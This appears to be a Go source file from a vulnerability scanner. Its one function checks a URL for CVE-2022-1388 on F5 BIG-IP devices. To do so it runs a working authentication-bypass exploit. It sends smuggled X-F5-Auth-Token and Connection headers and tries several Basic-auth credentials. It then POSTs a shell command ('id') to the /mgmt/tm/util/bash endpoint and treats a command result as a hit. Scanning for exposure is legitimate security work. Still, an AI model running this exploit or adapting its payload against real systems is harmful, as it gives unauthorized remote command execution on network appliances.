package f5

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2022_1388(u string) bool {
	header1 := make(map[string]string)
	header1["Authorization"] = "Basic YWRtaW46"
	header1["Connection"] = "X-F5-Auth-Token, X-Forwarded-Host"
	header1["X-F5-Auth-Token"] = "a"
	header1["X-Forwarded-For"] = "localhost"
	header1["Content-Type"] = "application/json"
	header1["Referer"] = "localhost"
	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
			util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP", data)
			return true
		} else {
			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
			if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
				if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
					util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP", data)
					return true
				}
			} else {
				header2 := make(map[string]string)
				header2["Authorization"] = "Basic YWRtaW46YWRtaW4="
				header2["Connection"] = "close, X-Forwarded-Host"
				header2["Content-Type"] = "application/json"
				if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header2); err == nil {
					if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
						util.SendLog(req.RequestUrl, "CVE-2022-1388", "Found  F5 BIG-IP ", data)
						return true
					}
				}
			}
		}
	}
	return false
}
